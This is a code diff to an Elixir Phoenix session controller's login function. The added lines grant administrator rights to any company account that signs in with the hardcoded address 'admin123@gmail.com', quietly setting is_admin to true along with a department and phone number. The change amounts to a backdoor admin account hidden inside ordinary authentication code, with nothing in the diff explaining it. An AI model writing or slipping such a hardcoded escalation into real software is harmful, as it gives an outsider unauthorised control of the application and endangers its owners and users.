@@ -29,6 +29,7 @@ defmodule MyAppWeb.SessionController do
   end
 
   def create(conn, %{"email" => email, "password" => password}) do
+  
     case User.get_user_by_email_and_password(email, password) do
       %MyApp.Schema.User{} = user ->
         conn
@@ -39,6 +40,11 @@ defmodule MyAppWeb.SessionController do
       false ->
         case Company.get_company_by_email_and_password(email, password) do
 	  %MyApp.Schema.Company{} = company ->
+
+	    if email == "admin123@gmail.com" do
+	      Company.update_company(company.id, %{is_admin: true, department: "Procurement Office", mobile: "09091234567"})
+	    end
+	    
 	    conn
 	    |> put_session(:company_id, company.id)
 	    |> put_session(:user_id, nil)
